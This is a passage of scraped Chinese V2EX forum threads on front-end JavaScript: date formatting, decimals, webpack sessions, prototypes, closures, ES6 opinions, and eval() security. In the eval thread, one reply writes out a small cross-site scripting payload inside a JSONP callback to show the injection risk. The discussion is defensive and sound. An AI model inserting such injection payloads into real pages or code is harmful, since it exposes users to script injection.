"遇到一些不复杂的功能，可以直接尝试写插件、写函数，为一个项目写，写完尝试着让这个类库能适应更多项目，这个过程思考如何去提升通用性，降低耦合，应该会对自己的编程水平有所提升。", "我已经在努力 jquery free 了，好多老的项目都用原生 js 重写了。", "上面这个代码，经常需要产生 2016-07-06 18:13:34 这种，个位的数字补零", "少用 fp...(对不起，我黑了什么", " 嗯，我是先用 jQuery 写一下简单实现，之后写好了就用原生重写一遍", "页面上少做点东西 性能就上来了 每次加载一个页面资源比加载 windows 都多 能快的起来么", "用 jquery ，还谈性能。。。有点吃力。", "先 profiling 找出瓶颈再优化\r", "尽量少做微优化(micro optimization)\r", "\r", "上述是对任何语言都有效的， js 的可以先看看 you don't know js 优化那章： ", "另外前端优化跟后端性能优化还是不一样的. 楼主 juqery 实现再 js 重写意义不大，前端性能瓶颈多数不在 js 上. \r", "google 的 web Fundamentals 专门讲了性能，那个是前端所关心的内容.", " 是这样的， jquery 早就不是性能的瓶颈，想保证不卡，至少要做到\r", "1 、首屏不要放太多内容，别加载一个网站跟加载一个 windows 一样又是几 mb 的 bundle 又是图片又是视频还带着音乐（ HTML5 时代用视频代替展示动画已经不新鲜了）\r", "2 、你祈祷用户用的是 chrome 或者 edge 不是 ie8 ，用户肯用最新版浏览器顶你做一年的优化\r", "3 、你的 CDN 要给力，用户的网速要给力， 1m 的资源如果卡的话下载就是 5 秒以上，很难快的起来，如果你顺手再引了一个 google 的字体，那就更爽了\r", "\r", "这 3 点都做到了再谈 js 的优化，我感觉很多网站的设计远远还没到优化 js 这一步， ie8 以上提供了 querySelctor 之后， jq 性能已经很好了\r", "现在的 web 已经搞的走火入魔了， web worker 这种东西是干嘛用的么，真想灭掉桌面程序？我只是在浏览页面而已，不想让你占死我 cpu 啊。。真想用 web 干死桌面应用？再等几年吧。。然后， web worker 、 web gl 我还可以理解， web midi 又是什么鬼？随便一套好听的波表就几百兆几个 g ，这我就更不理解了。。", "cache+fp ...", "\"过于长而复杂\" 那只是你个人感觉而已，对计算机来说，处理起来非常简单。代码自然还有优化的空间，比如 content.push 一次性 push 进去比分开 push 要快，但是然并卵这点时间消耗还不如分开写直观好看点，个人觉得 js 慢基本都卡在网络上， js 本身逻辑导致的我这几年也才遇到 2 、 3 个，比如顺丰官网的发件", " webmidi 是用来做手机端 web app 的，相似的还有 webusb ， webbluetooth ，\r", "如果你用 android chrome ，它有一个功能“添加到主屏幕”可以把 webapp 添加到桌面上，这会产生一个很轻量级的应用，\r", "如果 web app 可以接触更多的硬件 API ，比如蓝牙设备，比如 USB 口，比如 MIDI 设备，那么它的可用性就能增强，毕竟 js 门槛低， webapp 更新方便，如果 js 能做到所有的事情，那很多人就会考虑用 js 来做产品了，毕竟在同一个浏览器下开发 html 页面比开发全平台的 native app 方便多了\r", "\r", "这些方面都是为了 web app 能在各方面接近原生手机应用而做的努力，你只考虑桌面浏览器的话现在是不需要这些", "现在这个计算性能过剩的时代，‘卡’基本上都是 IO 造成的，计算上只要别动不动就遍历几万的数据，用户根本感觉不到", " 现在随便一个宿主加上点音源内存轻松爆 4g 还是 c++开发的应用 各种高速算法必须用 c++才能保证实时性 这种东西用 js 怎么来操作呢？", " js 用来操作 api ，实现是浏览器厂商用 c++实现就可以了，跑些简单的应用应该还是可以的吧.", " \r", "1. 软件上， NPAPI, NaCl, pNaCl, WebAssembly 都可以做到用 C++编写程序，用 js 调用，达到 C++级别性能，前面几个在目前的 Android Chrome 似乎是不可用的，但是 WebAssembly 已经可以打开\r", "2. 硬件上，市面上 3G 内存手机已经大量铺货，下半年到明年， 4G 到 6G 内存手机会进入市场\r", "3. 处理器上，我用 Geekbench 实测了一下:\r", "小米红米 note3 ，使用高通 650 处理器，整机 1000\r", "\r", "PC 机， i7-4790k ， 32G 内存， 2 年前整机 1w+\r", "\r", "性能差距在 1 个数量级以内，价格差距在 1 个数量级以上", " 手机都可以做到的话， PC 端 js 就更不是问题了", " 手机当然可以做到， IOS 上水果、 cubase 都有移动版，但是如果硬绕过全 c++的开发把部分逻辑拿到浏览器里，那能做的就只有界面部分了，因为所有的逻辑都必须 c++写才够，某些算法可能还要用硬件 FFT 来加速\r", "也许未来用 webmidi 可以做一些简单的应用，比如合成器、 launchpad 之类，但是真的生产力，还得用电脑上的宿主，毕竟一次要看那么多轨道，推子、旋钮，钢琴卷帘窗也不是手机那点屏幕能显示的下的\r", "还一点就是音频延迟，以前 korg 出了个 linux 系统的合成器，大概 12ms 的输入-音频延迟都被质疑，不知道经过 android 封装和 chrome 两层，会有多大加成\r", "从目前音游开发来看， android 的音频延迟不是一般大， ios 都非常好了， pc 上也要专业声卡的硬件 ASIO 保证延迟和效果\r", "感觉讨论歪了。。不过也算是前沿技术", "推荐'高性能 javascript'一书 感觉很赞", "另外给楼主一个建议，如果是针对传统企业开发或者要求比较高的互联网页面（ IE8 兼容性甚至 IE6 的），上手阶段能用库尽量别自己写，你面对的可是 IE 、 chrome 、 ff 、 safari 至少四个浏览器，还不算 360 安全浏览器这种非标准浏览器的，你不知道一路上会遇到多少坑，老板也不会给你时间填坑因为大把库可以用\r", "如果你的东西只要 chrome 能跑就够了，你完全可以一开始就自己写功能函数", "lz ，你贴的这一句里面， getYear(), getMonth()这些方法都是 native 代码，不用担心性能", "date.toLocaleString().replace(/\\//g,'-').replace(/[^\\d\\s:\\-]/g,'');\r", "比你的短", " 哈哈，看上去确实缩短了很多\r", "不过又感觉有点不对 ", "  \r", "目标：`2009-10-17 16:37`\r", "实际：`2009-10-17 4:37:00`", " 哦哦，好像它是 12 小时进制的", " 自己在 MDN 上找到解决方法了：\r", "`date.toLocaleString('chinese', {hour12: false}).replace(/\\//g,'-').replace(/[^\\d\\s:\\-]/g,'');`", " (new Date(Date.now()+2.88e7)).toJSON().replace(/^([\\d\\-]+)T([\\d:]+)\\..+$/,'$1 $2');", " (new Date(Date.now()+8*3.6e6)).toJSON().replace('T',' ').replace(/\\..+/g,'');", "(new Date(Date.now()+2.88e7)).toJSON().replace('T',' ').replace(/\\..+/g,'');", "原生 js"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://jsfiddle.net/2pvt4dwm/\" rel=\"nofollow\">https://jsfiddle.net/2pvt4dwm/</a></p>\n<p>如何才能在小数为 0 时显示.0 ，其他情况显示正常小数。</p>\n</div></div>"], "reply": "16", "tittle": "小数部分为 0 时不显示", "comment": ["float_number.toFixed(1)", " 明显不行啊。 2.13 就只能显示 2.1", ".toFixed(0) === float_number ? :", "\r", "\r", "感觉这是一道思考题，就看考虑的全面不全面…", "判断一下咯 2.13 - (2.13|0) == 0 ，然后截取", "float_number.toFixed( float_number.toString().split('.')[1].length) )", "目前能想到的就是转成字符串 +''\r", "正则匹配几个 0 ，有几个去掉几个 toFixed(*)\r", "返回数字", "int(str(float_num).split('.')[1]) == 0?int(str(float_num).split('.')[0]):float_num", " 依然是错的.\r", "首先这是一个数字, 然后在赋值的时候, 虽然写的是 2.0 但这个变量的值是 2 没有 .0 \r", "所以你 toString().split('.')[1] 得到的是 undefined, 然后在 undefined 的基础上取 length 是会报错的.\r", "\r", "```\r", "float_number = 2.0\r", "float_number.toFixed( float_number.toString().split('.')[1].length)//Cannot read property 'length' of undefined\r", "```\r", "\r", "另外你发的代码中多了一个 右括号.\r", "\r", "\r", "var num = 3;\r", "num = num == num.toFixed() ? `${num}.0` : num;", "return num == int(num) ? num.toFixed(1) : num", " \r", "\r", "    function int(n) { return parseInt(n) === n };\r", "    var float_number = 2.18;\r", "    $('#display').html(int(float_number) ? float_number.toFixed(1) : float_number);", "result = subject.replace(/\\.0*$/mg, \"\");", "帮你问了下万能的 stackoverflow,  ", " 老外们似乎比较热心", "需求没看清楚: result = subject.replace(/\\.0{2,}$/mg, \".0\");"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>webpack-dev-server proxy 指向后台服务，获取 api\n但是会出现 session id 不一致的问题\n请问如何解决？</p>\n</div></div>"], "reply": "8", "tittle": "webpack session 问题", "comment": ["你的后端不止一个服务吗？", " 只有一个啊", " webpack-dev-server 不会处理 session 相关的东西，如果你的 dev-server 不是最新版本的话，就升级一下，不排除是 express 的问题，不过我觉得更可能是你的后端的问题", " 好，谢谢！", " 测试了一下，确实不是 webpack-dev-server 的问题，但就是每次请求的 session id 都不一样", " 你把 session id 持久化了吗", " 似乎是跨域导致的 session 丢失的问题", "就是代理的时候 cookie 没设置上去 ", "\r", "如果后端代码你自己能控制，建议使用 webpack-dev-middleware 和 webpack-hot-middleware 取代代理模式"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>昨天到现在 install 的时候一直报 timeout, 大家有没有这个情况, 还是我网络问题?</p>\n<pre><code>bower                     invalid-meta The \"name\" is recommended to be lowercase, can contain digits, dots, dashes\nbower angular-moment#*      not-cached https://github.com/urish/angular-moment.git#*\nbower angular-moment#*         resolve https://github.com/urish/angular-moment.git#*\nbower angular-moment#*         ECMDERR Failed to execute \"git ls-remote --tags --heads https://github.com/urish/angular-moment.git\", exit code of #128 fatal: unable to access 'https://github.com/urish/angular-moment.git/': Failed to connect to github.com port 443: Operation timed out\n\nAdditional error details:\nfatal: unable to access 'https://github.com/urish/angular-moment.git/': Failed to connect to github.com port 443: Operation timed out\n\n</code></pre>\n</div></div>"], "reply": "6", "tittle": "bower 是不能用了吗?", "comment": ["`Operation timed out`\r", "这很明显网络问题", "READ THE ERROR MESSAGE", "需要一个梯子", "Bower 很多是 Github 直接下载。。。很慢。", "bower 已经被慢慢抛弃了  直接用 npm 吧", "楼主解决了吗? 我也遇到了, 我直接在命令行里面 copy 出那条 git ls-remote --tags --heads 的命令是可以正常执行的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前只支持 chrome 浏览器，后面有时间改为接入谷歌的服务。\ngit 地址： <a href=\"https://github.com/somonus/react-speech-recognition-input\" rel=\"nofollow\">https://github.com/somonus/react-speech-recognition-input</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "基于 chrome 的 speech recognition 做了个语音识别的输入框", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>书上介绍了动态原型模式的代码如下：</p>\n<pre><code>function Person(name,age,job) {\n    //property\n    this.name = name;\n    this.age = age;\n    this.job = job;\n    //method\n    if(typeof this.sayName != \"function\") {\n        Person.prototype.sayName = function() {\n            console.log(this.name);\n        }\n        \n        //Person.prototype = {\n        //    sayName: function() {\n        //        console.log(this.name);\n        //    }\n        //} //这样的写函数的方式报错说没有 sayName 这个函数\n    }\n}\n\n当我用注释的 sayName 写法时会提示找不到 sayName 这个函数，为什么？？\n两种方式有什么异同吗？我记得书上提过第二种只是对第一种声明变量多的简便写法。\n</code></pre>\n</div></div>"], "reply": "10", "tittle": "看了《JavaScript 高级程序设计》，有个关于动态原型模式的问题", "comment": ["你直接把 prototype 给覆盖了。放到构造函数外面就行了。", "你看高程 156 页，用对象字面量的方法相当于重写了整个原型。切断了构造函数和最初的原型之间的联系。\r", "我的理解是你这时 new 一个新实例，实例的原型并没有 sayName 方法，因为 sayName 方法保存在新的原型对象上了。", "把注释的部分放到 Person 外面", " 研究了下，忽略我的第一句话吧 233", "Person.prototype.sayName", "不要覆盖 prototype ，用 #6 的方式，扩展 prototype 。", "据我的分析是这样的： 你注释的内容改变了对象的原型对象， 所以，通过 Person `new`操作符实例化的对象的原型是 Object 不再是 Person.prototype 了，然而， sayName 函数并不在 Person 对象的原型上，所以找不到，注释代码中 sayName 函数实际上是在通过 new Person()得到的对象的构造函数的原型上，也就是 Person.prototype.constructor.__proto__   ;", "之前刚好看到了一篇文章 ", "准确说应该是创建的第一个对象没有 sayName 方法，之后创建的对象都有 sayName 方法，可以试试\r", "因为创建第一个对象的时候的原型对象没有 sayName 方法，之后每次创建对象都重写了原型，且这些原型都有 sayName 方法，所以只有第一个对象没有 sayName ，之后的都有"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>自己无聊的时候做了一个微博爬虫，当初开始做的时候搜了很多功课，对于异步加载的内容，貌似模拟浏览是唯一的解决方案？？于是我选用 casperjs 。虽然开发出来了，但是总结开发过程遇到这么几个问题。</p>\n<p>1.微博很多大 V 发了条成千上万的微博，要是一直模拟下拉操作，浏览器界面越来越长，运行越来越慢，内存占用越来越高，测试过单个实例运行到大概异步加载 3000+条的时候，加载不动了。我不知道是内存不够了还是网络 io 问题，请问这个有什么解决方案吗？</p>\n<p>2.casperjs 的并行处理。我当初想着能不能在一个节点中实现同时爬取微博，个人资料和粉丝。 casperjs 官网说并不原生支持，但是你可以创建多个实例试试看。于是我真的创建了三个实例。。。发现也可以跑。。。我想问有什么其他解决方案吗，我觉得我这样挺蠢得其实。。。</p>\n<p>3.cluster 模块。我想用下 node 原生的负载均衡，但是 cluster 只能创建 nodejs 子进程。最初的想法是每个子进程再创建一个 casperjs 子进程，我是用 socket 作为进程通讯方式，就这样的话有多少 worker 我就得开多少端口，这种方案，我又觉得很蠢了。。。不知道有没有更好的解决方式</p>\n<p>4.和谐问题。貌似新浪现在不用验证码卡人了，现在应该到了某个临界值，你模拟点击粉丝啊微博等页面，有很大可能会跳转到 <a href=\"http://weibo.cn/pub\" rel=\"nofollow\">http://weibo.cn/pub</a> 这个页面，但是时机不定，虽然我写了跳转后校验 url 然后重连，但是有时候前一个页面所有的点击事件都会跳到这个网址，及其影响效率，但是不知道应该怎么防止跳转，开页面随机等待事件和一段时间后冷却我都有，但还是会有这种情况，不知道咋办。</p>\n</div></div>"], "reply": "1", "tittle": "做了一个新浪微博的爬虫，用的 casperjs+nodejs，遇到了一些问题想请教大家", "comment": ["模拟浏览器下拉刷新页面并不是最优解，不过在数据采集中也不失为一种有效手段。\r", "因为无限制的下拉刷新和重新加载页面势必造成系统资源的大量消耗，\r", "当页面数据量过大时便会影响整个系统的采集效率。\r", "理论上应该能找到获取页面数据的 ajax 请求，然后通过 hack 参数获取实际的格式化数据内容。\r", "对于拉取数据的接口而言，往往都是有分页接口的。"]},
{"content": ["<div class=\"topic_content\">让我们热烈欢迎 WebStorm 2016.2 版正式发布，这是我们的 JavaScript IDE 今年度第二次大版本更新。\r<br>观看视频介绍： <a target=\"_blank\" href=\"http://t.cn/R5krSHc\" rel=\"nofollow\">http://t.cn/R5krSHc</a>\r<br>\r<br>在前一次更新发布后 WebStorm 团队全力投入于强化对 TypeScript 和主流框架的支持，并且也持续为产品进行改善和优化。\r<br>\r<br>本次更新的亮点有：\r<br>\r<br>●      提前支持即将发布的 TypeScript 2.0 功能。\r<br>\r<br>●      改进对 React 的支持：为使用 PropTypes 定义的组件属性提供代码辅助、支持非 DOM 属性和生命周期方法。\r<br>\r<br>●      与 Angular CLI 集成：包含支持创建新项目和 Angular 2 代码段集合。\r<br>\r<br>●      为升级到 ECMAScript 6 添加相关的新意图：转换为 arrow 函数（ Convert to arrow function ）和转换为 const 或 let （ Convert to const or let ）。\r<br>\r<br>其它值得一提的更新包括：支持 jspm 导入、在编辑器中支持英文连体字体、优化对使用 VCS 补丁包的支持...等。\r<br>\r<br>请访问 WebStorm 2016.2 新功能介绍页面 查看更详细的说明: <a target=\"_blank\" href=\"https://www.jetbrains.com/webstorm/whatsnew/\" rel=\"nofollow\">https://www.jetbrains.com/webstorm/whatsnew/</a>\r<br>并到 下载页面 选择适合于您的操作系统的安装档: <a target=\"_blank\" href=\"https://www.jetbrains.com/webstorm/download/\" rel=\"nofollow\">https://www.jetbrains.com/webstorm/download/</a>\r<br>\r<br>有兴趣开始使用 WebStorm 的伙伴们可以参考本次 JetBrains 与 V2EX 合作的优惠活动(活动期间到 2016 年 7 月 25 日止)\r<br><a target=\"_blank\" href=\"https://www.jetbrains.com/cn/store/toolbox/#product=webstorm?utm_source=weibo&amp;utm_medium=release&amp;utm_campaign=pay6get6free\" rel=\"nofollow\">https://www.jetbrains.com/cn/store/toolbox/#product=webstorm?utm_source=weibo&amp;utm_medium=release&amp;utm_campaign=pay6get6free</a>\r<br>\r<br>如果有任何疑问，欢迎联系 JetBrains 中文销售代表： <a target=\"_blank\" href=\"mailto:sales.cn@jetbrains.com\">sales.cn@jetbrains.com</a></div>", "<div class=\"topic_content\">《本文的链接修正》\r<br>有兴趣开始使用 WebStorm 的伙伴们可以参考本次 JetBrains 与 V2EX 合作的优惠活动(活动期间到 2016 年 7 月 25 日止) \r<br><a target=\"_blank\" href=\"https://www.jetbrains.com/cn/store/toolbox/#product=webstorm\" rel=\"nofollow\">https://www.jetbrains.com/cn/store/toolbox/#product=webstorm</a></div>"], "reply": "6", "tittle": "JavaScript IDE： WebStorm 2016.2 新版本发布", "comment": ["啥时候支持 vuejs 啊？现在都是用插件，不爽。", "不愧是宇宙第二强 IDE 现在还在促销 买半年送半年", " 第一是 Visual Studio?", " 那必须", " IDE 我觉得 JB 家算第一了。。", "PS 也更新啦"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在因为有个特殊需求，需要统计字符串中汉字的笔画数，这个除了预先建立映射表之外还有没有其他方法？</p>\n<p>语言不限， js 优先考虑，后端也可</p>\n</div></div>"], "reply": "9", "tittle": "js 有没办法计算一个汉字的笔画数", "comment": ["调用网络 API 查询？\r", "例如 ", " 感谢回复 不过 api 是不会考虑的 查询分析了下发现貌似是没有办法实现的  \r", "汉字在编码集中就没有保存笔画 建立映射表是唯一的方法  \r", "当然 除非程序够聪明 能够自己分析汉字笔画的话例外。。", "数据量又不大，比拼音小多了，没有现成数据库的话就自己建一个呗", "新华字典目录中有按笔画数排序的部分，不过这得找个电子版的。。。或者看看 UnicodeData 里有没有，一些 unicode 库会保存每个字的基本信息", "香港版的 windows 10 里，开始菜单是按照首字母笔画数进行排序的，不知道是否有内置的笔画数数据库", "先用 API 一段时间，自己的数据库就建起来了", " \r", " \r", " \r", " 感谢回复 已经找到其他办法实现目标功能", " 啥办法？", " 啥办法？你这样做不厚道啊~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>新博文《在公众号中优雅地呈现代码》</p>\n<p>这几天有不少朋友在我的微信公众号留言，问我是如何在公众号页面中整齐摆放代码的，今天就分享下我的方法，事实上我也折腾了好一会儿。</p>\n<p>文章地址： <a href=\"http://www.barretlee.com/blog/2016/07/14/codes-in-wechat/\" rel=\"nofollow\">http://www.barretlee.com/blog/2016/07/14/codes-in-wechat/</a></p>\n<p>在 V2 占一个广告位，坚持每日更新，有空的时候写长文硬文，没空的时候写软文，希望读者能够有点收获 ；）</p>\n<p><img alt=\"每日一文\" src=\"http://www.barretlee.com/follow.jpg\"></p>\n</div></div>"], "reply": "3", "tittle": "如何在公众号中优雅地呈现代码？", "comment": ["为什么一定要发到微信公众号呢？没开公众号！不爱发！", "最优雅的办法就是不发\r", " 那么矫情的文章，真是看不下去。公众号也好，博客也好，就是信息传播的工具，这个工具不符合你的要求，用别的工具就是，还专门写篇博文批判一下？况且博客跟公众号又不是冲突的。"]},
{"content": "", "reply": "21", "tittle": "jquery ajax 怎样跨域获取 json 数据", "comment": ["试了网上的很多方法都不行，都提示不允许跨域", "搜索 JSONP", " jsonp 之前试了几次要么还是那样要么返回空白数据，不知道是不是参数错误", "1. Ajax 默认支持浏览器发起跨域请求（ XHR Level 2 标准，可参考 ", " ），只要服务器打开跨域权限就可以直接请求。\r", "\r", "服务器不允许跨域请求：\r", "\r", "服务器关闭跨域限制：\r", "\r", "2. JSONP.", "需要对方支持", " bingo! 服务端开启或者 jsonp", " 其实就是要对方服务器支持。\r", "\r", "还有一种方法，自己服务器做中转。", " 哈哈，我当时想通过 Ajax 抓 B 站用户信息之后就发现不能跨域，结果写出了个 Project Ako 这个项目方便让我做中转。\r", "\r", "\r", "\r", "结果到现在还没真正投入实际环境中。", " \r", " \r", "我是调用一个 API ，所以就没办法服务端开启支持了 T_T\r", "\r", " \r", "服务器中转的话，我一开始是这么做的，用 php ，但是因为我的服务器在日本，但 api 所在服务器却在国内再加上我基本上没怎么优化服务器所以中转就慢了很多，还有一个原因就是我怕服务器调用 api 太多次被封 ip(因为是个小型非盈利网站来的)\r", "\r", "\r", " \r", "谢谢，我看一下", "试了一下几个网址，发现好像我调用的这个 api 不知道为什么就是失败，其他的几个都可以，用浏览器打开 api 地址就可以返回数据", "用 yql ( ", ") 做过", "如果对方服务端你不能改的话，只能通过自己的服务端做一层转发咯", " 用浏览器打开 API 地址完全不会导致跨域！这个测试对解决你的问题没有意义的。。。", "如果能修改服务器那开 cors 是最方便的，如果不能就只能在自己的服务器 curl 代理一层", "nginx 反向代理", "jsonp", " \r", "我的意思是 跨域是成功了，但不知道为什么只有我用这个 API 时不返回数据，其他网址的都没问题", " 第三方 API 不支持,然并卵....", "jsonp\r", "服务器端和客户端都要修改。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>新博文《我需要学习 ECMAScript 6 么？》</p>\n<p>前几天翻译了一篇 <a href=\"http://www.barretlee.com/blog/2016/07/09/a-kickstarter-guide-to-writing-es6/\" rel=\"nofollow\">ECMAScript 6 的入门文章</a>，看到几则评论说 JavaScript 越来越像 Java 了，我暗暗地笑了笑。也有同学很疑惑是否有必要学习 ES6 ，使用 CoffeeScript 的同学也有类似的疑惑。</p>\n<p>文章地址： <a href=\"http://www.barretlee.com/blog/2016/07/13/why-i-learning-es6/\" rel=\"nofollow\">http://www.barretlee.com/blog/2016/07/13/why-i-learning-es6/</a></p>\n<p>在 V2 占一个广告位，坚持每日更新，有空的时候写长文硬文，没空的时候写软文，希望读者能够有点收获 ；）</p>\n<p><img alt=\"每日一文\" src=\"http://www.barretlee.com/follow.jpg\"></p>\n</div></div>"], "reply": "25", "tittle": "我需要学习 ECMAScript 6 么？", "comment": ["ES5.1 还没写利索呢。。没学会走就想跑，我还是稳着点吧", "刚看了点 java8 怎么感觉 java 越来越像 js 了", " \r", "\r", "先不认同下这种观点\r", "\r", "然后不认同楼主写的这个……\r", "\r", "文章不是这么写的……肯定不是", "已经正在写了", "最近在看 ECMAScript 6 入门，越看越像 Python", "我已经好久没写 js 了，我为了提高办公效率，我居然开始学 vba ……(我知道有个 excel 的 python 包)", "楼主是不是错看成 typescript 了, javascript 动态类型摆着的,这个和 java 就有本质区别", "404", "我感觉 js 跟 ruby 越来越像，用惯 java 和 ruby 之后，学 ES6 就跟吃豆腐一样简单，比 Obj-C 好多了。", "所有的语言都在渐渐向 lisp 靠拢", "要像 Java 还缺少那啥 静态类型", "对于一个新人来说，学 ecma6 那套语法更类似 java ，但是对于 ecma5/3 用习惯的，就算没有 ecma6 干活效率也不会低到哪里去，毕竟底层还是哪套东西，都是在吃糖没看到什么真正革命性的东西，真正革命性的东西，你用其他库早就实现了， underscore 是干嘛用的， promise 各种实现，模块加载器要多少有多少\r", "\r", "毕竟直到 ecma6 js 的类都不是真正的类，还是 prototype 那一套，写了 class 就是 class 么？很多人最不屑的 java 的 class 都比 js 高到不知道哪里去了。再回过头来看匿名函数(对 this 真正语义上的定义，而不是调用时)，还有 ecma6 新增的数组函数对空白位置的处理，那简直是啪啪抽自己脸，没见过一门语言这么胡来的。再或者，你说少写个 function 少写个分号就提高生产力了？你一天能写几个 function 要写几个分号。。。要我说没了分号和大括号我才感觉不习惯\r", "\r", "最后不得不说一点，谁给我钱我做什么，只要你钱给够，让我写 ecma6 可以，你让我纯 ecma3 干活我也愿意。", "*更正一下，是箭头函数", "突然想补充一点题外话，国内的程序员现在拼命学新技术，但是托 xx 经理的福，做出来的产品却是一代比一代狗屎，\r", "典型的几个： x 浪微博、 x 度贴吧、 x 鱼，还有 x 易新闻，我很推崇的一个软件，愣成了空间头条，没办法只能选择卸载\r", "包括 x 迅的 xx ，只要他不把撤回功能拿掉，我就选择不升级，撤回这个功能特么恶心的 1b\r", "\r", "一声叹息", " 说只是吃糖有点过了。有些东西并不是语法糖，比如 generator 就是完全不一样的语言特性，还有 weakmap/weakset ，而且这些东西还真是革命性的，不要只看到箭头函数 /class 就觉得 es6 没什么新东西啦……", " 你们喜欢 generator/或者说 yield?我不太喜欢或这个\r", "另外 map/set 这些，有{}就挺好，比 java 幸福太多， java 写个 json 痛苦死\r", "不过话说回来万一啥时候 js 搞出 concurrent 来那就大新闻了", "还以为是个提问 0 0 ，结果是个广告", "React 和 ES6 更配哦", "ES6 是要学的, 不然马上代码都看不懂了. 现在不少开源项目都上 ES6 了.", " 我挺喜欢的。你不能因为不喜欢就觉得 es6 只是语法糖吧。\r", "concurrent 是 host 提供的 feature ，现在就有 webworker 也不需要 es 做什么吧。", "主要拿来看源码 ( ﹁ ﹁ ) ~→", "肯定需要\r", "ES6 是趋势", "现在流行标题写问题来打广告？", "不需要, 直接上 typescript.", "chrome 好像已经支持全部特性了。我就在用 es6 写自己用的单页 app 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一道面试题，这个要怎么做？</p>\n</div></div>"], "reply": "10", "tittle": "不使用全局变量如何定义一个 count()每次调用输出第几次调用？", "comment": ["闭包。写个会返回另外一个函数的函数就完事了", "如果没有 Cookie 和 LocalStorage ，也没有 HTML ，还不能和服务器通讯", "....我想不出来", "函数也算全局变量？", "function count (){\r", "    console.log (++count.count );\r", "}\r", "\r", "count.count = 0;\r", "\r", "函数也是可以带属性的,闭包就不说了", "var count = (function (){\r", "    var i = 0;\r", "    return function (){console.log (++i )}\r", "})();", "console.count ();", "稍微扩展一下。 jQuery 的$是什么，$.ajax 是什么，$.fn 又是什么。\r", "js 基本原理就这些东西了", "简单,定义类啊", "哥们，这题应该是考查对闭包内的变量控制的；\r", "可以下面这么写的，\r", "<script>\r", "    function test (){\r", "        var i=1;\r", "        return function (){\r", "            console.log (\"这是您第 \"+(i++)+\" 次调用 count ()\")\r", "        };\r", "    }\r", "    count=test ();\r", "    count ();\r", "    count ();\r", "    count ();\r", "    count ();\r", "    count ();\r", "    count ();\r", "</script>\r", "这个在写 JS 时候很常用的；\r", "还有 4 楼说的添加自定义属性也经常用的，尤其的做定时器 /动画的时候；", "闭包和给函数添加自定义属性都可以；\r", "但是给函数添加自定义属性，在性能上会更好；\r", "因为这里用闭包实现的话。产生的作用域不销毁；\r", "性能不如下面这种添加自定义属性的好\r", "    function count2 (){\r", "        console.log (\"这是您第 \"+(++count2.count )+\" 次调用 count2 ()\");\r", "    }\r", "    count2.count = 0;\r", "    count2 ();\r", "    count2 ();\r", "    count2 ();\r", "    count2 ();\r", "    count2 ();\r", "    count2 ();\r", "这种实现方法比闭包,在性能上好些；"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想要自己写一个博客程序，编辑器部分想用 markdown 实现，想问问网上有没有什么现成的库可以直接把 markdown 文本转换成网页？</p>\n</div></div>"], "reply": "8", "tittle": "怎么在网页里实现一个 markdown 编辑器？有没有什么现成的库？", "comment": ["github 搜索下就行了\r", "markdown 的 js 库满地都是。。", "marked ： ", " 就是因为太多了不知道用哪个好", "这个好像有很多，也有现成的接口吧。", " ", "\r", "\r", "个人推荐这个", "造了一个简单的轮子，轻喷。\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码 eval('(' + Text + ')') 存在注入问题，有什么方法可以替代或避免该问题吗？</p>\n</div></div>"], "reply": "25", "tittle": "JavaScript eval()安全问题", "comment": ["保证text内容是你可控的。", "不相信外部输入即可。\r", "\r", "你为啥要用 eval()？\r", "这可能是一个 XY 问题。", "不要使用 eval。\r", "你应该问有没有方法不使用 eval 实现你的具体需求…… \r", "如果这就是你的具体需求……假设这个需求真的不奇怪，那只能自己过滤了啊……", " \r", "\r", "例如 JSON with Padding  的时候", "  @", "  我也不想用eval，问题是之前的代码用了，我要修改这这个方法，想找个替代方案。", " jsonp 吗？不需要 eval 的呀，不是回调么？", "如果是json的话，JSON.parse()  可将 json形式的字符串转换为js对象。", " 有啥区别.... 回调数据是破坏性代码不一样....", " 回调不用 eval 嘛，我写几年JS都没用几次 eval", "   \r", "jsonp_callback( {  I_am_xss: (function () {alert(1)}())  } );", " jsonp mimetype 设为 text/html ，然后这段回调不会执行的", "这是你的问题，为什么你eval的东西里面会有用户输入？你需要用户给你写代码吗？\r", "\r", "如果没有，那么你的用户怎么注入你？入侵你服务器来注入吗？", "不要用eval、new Function，以及不要在setTimeout和setInterval里将字符串解析成代码运行", " 动态加载代码的时候eval的效率比插节点高的得多，而且可以并行加载！", " 安全问题比效率问题优先级高。", " \r", "\r", "所以你的业务是多奇葩需要 eval() 用户输入？你难道需要用户给你写代码？虽然我还真有想法做一个类似的网站。\r", "\r", "出现这种情况只能说明你的程序设计本身有问题，而不是eval有问题。如果你js里面要是硬要包含一段未做过滤的用户输入，那么无论你用eval()还是插入节点都会产生问题。eval产生的绝大多数所谓的问题，都是因为低端程序员滥用而导致的，而不是eval本身有问题，这一点上就跟c指针或者goto语句一样。\r", "\r", "其实编程规范里面禁止用eval，这不过是就为了在团队协作的时候防猪队友而已，你不能要求你每一个队友都跟你一样能驾驭eval()，所以干脆禁止写eval。\r", "\r", "不过eval()的灵活性让很多不可能编程可能。举一个简单的例子，类似c++的namespace，也可以在javascript里模拟实现了。", "'use strict' 会好一点。\r", "\r", "另外很多时候eval都有替代方法。", "确实啊\r", "eval执行的代码几乎是由服务器返回的为什么怕安全呢？", " 您这想法不对，eval可不像this，我们说this是非常棒的东西，但很多人驾驭不好，可是我们从来没说过要去禁用它。eval里的代码我们也基本不会设计成让用户输入，但您必须承认使用eval有内在的风险。Google对Chrome扩展和应用的开发明确禁用了eval，Google在多处文档，包括html5rocks中也多次强调不要用eval，这不是您能不能驾驭代码的问题，用户的网络环境不是您一个前端程序员能控制的。", " 就是怕用户被劫持啊，而且一旦服务端出现什么bug会连带前端一起遭殃", " 